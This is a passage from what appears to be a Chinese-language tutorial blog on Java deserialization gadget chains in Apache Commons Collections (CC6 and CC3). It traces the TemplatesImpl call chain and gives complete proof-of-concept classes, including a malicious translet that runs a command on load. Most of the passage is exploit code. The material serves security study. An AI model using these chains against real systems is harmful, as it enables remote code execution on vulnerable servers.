class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ms08067;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String fileName = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException </span>&#123;<br><br>        Transformer[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformer);<br><span class="hljs-comment">//        chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">// 构造TiedMapEntry</span><br>        <span class="hljs-comment">// 注意传入的key存在（不存在触发transform）</span><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        <span class="hljs-comment">// put方法也会触发hashCode</span><br>        map1.put(tiedMapEntry, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">//put后修改tiedMapEntry的key值为不存在</span><br>        Class tiedMapEntryClass = TiedMapEntry.class;<br>        Field tiedMapEntryKey = tiedMapEntryClass.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        tiedMapEntryKey.setAccessible(<span class="hljs-keyword">true</span>);<br>        tiedMapEntryKey.set(tiedMapEntry, <span class="hljs-string">&quot;abc&quot;</span>);<br><br>        serialize(map1);<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(fileName)));<br>        Object obj = ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！！！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(fileName));<br>        outputStream.writeObject(object);<br>        System.out.println(<span class="hljs-string">&quot;序列化成功！！！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="cc3链">CC3链</h1><p>CC3链的利用点，或者说突破口，关键在于我们寻找的对象。</p><p>链条的利用点在于类加载机制中关于defineClass方法，在类加载机制的内容中，我们讨论过了defineClass如何实现类加载，但是这个问题的难点在于ClassLoader.defineClass方法是私有的，我们尝试在反序列化中找到一个方法来逐步获取到public的权限，实现反序列化链条。</p><h2 id="defineclass溯源">1、defineClass溯源</h2><p>我们从defineClass来寻找一条到public的链条，一直通过find Usages来寻找直到遇到方法newTransformer</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>newTransformer<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>getTransletInstance<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineClass<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>define<span class="hljs-constructor">Class(String <span class="hljs-params">name</span>, <span class="hljs-params">byte</span>[] <span class="hljs-params">b</span>, <span class="hljs-params">int</span> <span class="hljs-params">off</span>, <span class="hljs-params">int</span> <span class="hljs-params">len</span>)</span><br></code></pre></td></tr></table></figure><p>在具体的实现中分析一下，关键在于<code>TemplatesImpl.defineClass</code>中，我们能找到反序列化数据的传入。</p><p>其中关于_bytecodes是一个byte类型的二维数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> classCount = _bytecodes.length;<br>        _class = <span class="hljs-keyword">new</span> Class[classCount];<br><br>        <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>            _auxClasses = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>            <span class="hljs-comment">// 在这里反序列化</span><br>            _class[i] = loader.defineClass(_bytecodes[i]);<br>            <span class="hljs-keyword">final</span> Class superClass = _class[i].getSuperclass();<br><br>            <span class="hljs-comment">// 检查父类</span><br>            <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>                _transletIndex = i;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                _auxClasses.put(_class[i].getName(), _class[i]);<br>            &#125;<br>        &#125;<br><span class="hljs-comment">// 针对值进行判断</span><br>        <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;<br>            ErrorMsg err= <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;<br>        ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (LinkageError e) &#123;<br>        ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="templatesimpl构造">2、TemplatesImpl构造</h2><p>我们首先一步步回溯查看我们需要对TemplatesImpl类完成怎样的实例构造。</p><p>这里可以看到要对<code>_name</code>不赋值初值，并对<code>_class</code>赋初值，并且可以看到在这里完成类的实例化，帮助我们完成了类的初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_name == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><br><span class="hljs-keyword">if</span> (_class == <span class="hljs-keyword">null</span>) defineTransletClasses();<br><br><span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br><span class="hljs-comment">// class to prevent the GC from collecting them</span><br>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();<br>translet.postInitialization();<br>translet.setTemplates(<span class="hljs-keyword">this</span>);<br>translet.setServicesMechnism(_useServicesMechanism);<br>translet.setAllowedProtocols(_accessExternalStylesheet);<br><span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-keyword">null</span>) &#123;<br>    translet.setAuxiliaryClasses(_auxClasses);<br>&#125;<br><br><span class="hljs-keyword">return</span> translet;<br></code></pre></td></tr></table></figure><p>其次就是上一步<code>defineClasses</code>方法，<code>_bytecodes</code>和<code>_tfactory</code>方法要完成赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-keyword">null</span>) &#123;<br>    ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>&#125;<br><br>TransletClassLoader loader = (TransletClassLoader)<br>    AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>        &#125;<br>    &#125;);<br></code></pre></td></tr></table></figure><p>继续往下查看反序列化数据的逻辑，发现类加载之后会对父类进行检查，因此我们可以将我们的恶意类改为特定类的继承。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ms08067;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span></span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化此时的正向链路</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ms08067;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String fileName = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class tc = TemplatesImpl.class;<br><br>        <span class="hljs-comment">// 赋值 _name</span><br>        Field name = tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-keyword">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;name&quot;</span>);<br><br>        <span class="hljs-comment">// 赋值 _tfactory</span><br>        TransformerFactoryImpl fatcory = <span class="hljs-keyword">new</span> TransformerFactoryImpl();<br>        Field factory = tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-keyword">true</span>);<br>        factory.set(templates, fatcory);<br><br>        <span class="hljs-comment">// 赋值 _bytecodes</span><br>        <span class="hljs-keyword">byte</span>[] codebyte = Files.readAllBytes(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;target/classes/com/ms08067/Evil.class&quot;</span>).toPath());<br>        <span class="hljs-keyword">byte</span>[][] myByteCodes = &#123;codebyte&#125;;<br>        Field bytecodes = tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>        bytecodes.set(templates, myByteCodes);<br><br>        templates.newTransformer();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="readobject的寻找">3、readObject的寻找</h2><p>寻找readObject的一个思路是直接照搬之前的CC6链，CC6链的起点本身就是因为InvokerTransform类能够实现针对某个类的反射方法调用，那么我们直接将newTransformer作为反射调用的方法传入即可实现对CC3链的利用。</p><p>除了这个思路，yoserial中利用的是寻找谁调用了newTransformer，并继续找到readObject。</p><p>这里的利用链如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<br>TrAXFilter.构造函数<br></code></pre></td></tr></table></figure><p>TrAXFilter是不可以被序列化的，但是因为在transformer中可以传入一个Class对象，从而实现该类的实例化，正好反序列化的入口点在构造函数中，且Class对象是可以被反序列化的，那么这个链路的实现就变得现实了。</p><p>链路走到调用<code>transform</code>方法，那剩下的链路自然轻车熟路了。</p><h2 id="poc与调用链-3">4、Poc与调用链</h2><h3 id="invoketransformer">4.1、InvokeTransformer</h3><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>readObject<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hashCode<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>trasnform<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>newTransformer<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>getTransletInstance<br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineClass<br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br></code></pre></td></tr></table></figure><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ms08067;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String fileName = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class tc = TemplatesImpl.class;<br><br>        <span class="hljs-comment">// 赋值 _name</span><br>        Field name = tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-keyword">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;name&quot;</span>);<br><br>        <span class="hljs-comment">// 赋值 _tfactory</span><br>        TransformerFactoryImpl fatcory = <span class="hljs-keyword">new</span> TransformerFactoryImpl();<br>        Field factory = tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        factory.setAccessible(<span class="hljs-keyword">true</span>);<br>        factory.set(templates, fatcory);<br><br>        <span class="hljs-comment">// 赋值 _bytecodes</span><br>        <span class="hljs-keyword">byte</span>[] codebyte = Files.readAllBytes(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;target/classes/com/ms08067/Evil.class&quot;</span>).toPath());<br>        <span class="hljs-keyword">byte</span>[][] myByteCodes = &#123;codebyte&#125;;<br>        Field bytecodes = tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>        bytecodes.set(templates, myByteCodes);<br><br>        <span class="hljs-comment">// templates.newTransformer();</span><br><br>        Transformer[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformer);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">// 构造TiedMapEntry</span><br>        <span class="hljs-comment">// 注意传入的key存在（不存在才能触发反序列化）</span><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        <span class="hljs-comment">// put方法也会触发hashCode</span><br>        map1.put(tiedMapEntry, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">//put后修改tiedMapEntry的key值为不存在</span><br>        Class 